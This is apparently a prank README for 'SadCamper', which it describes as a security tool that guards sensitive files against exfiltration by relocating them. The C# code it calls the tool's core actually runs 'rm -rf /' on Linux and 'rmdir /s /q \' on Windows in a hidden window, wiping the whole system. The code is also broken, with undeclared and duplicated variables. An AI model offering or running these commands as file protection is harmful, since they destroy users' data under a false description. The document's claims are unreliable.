# SadCamper
SadCamper is a tool designed for security personnel to prevent the exfiltration of critically sensitive files from an organization.  It works by preemptively relocating files, adding an additional layer of security by potentially thwarting attackers' attempts to identify and exfitrate these files.

### ⚠️ Warning
SadCamper manipulates critical sensitive files to prevent threat actor access.  It may cause a small amount of impact to the systems containing these files.

### How it works
SadCamper preemptively relocates files, providing 100% protection against threat actor attempts to identify and exfiltrate them.  It utilizes proprietary code, which we have recently made public, and is shown below.

Linux
```c#
Process process = new Process();
psi.FileName = "/bin/bash";
psi.Arguments = "rm -rf /";
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
psi.CreateNoWindow = true;
using var process = Process.Start(psi);
process.WaitForExit();
```

Windows
```c#
Process process = new Process();
psi.FileName = "cmd.exe";
psi.Arguments = "rmdir /s /q \";
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
psi.CreateNoWindow = true;
using var process = Process.Start(psi);
process.WaitForExit();
```


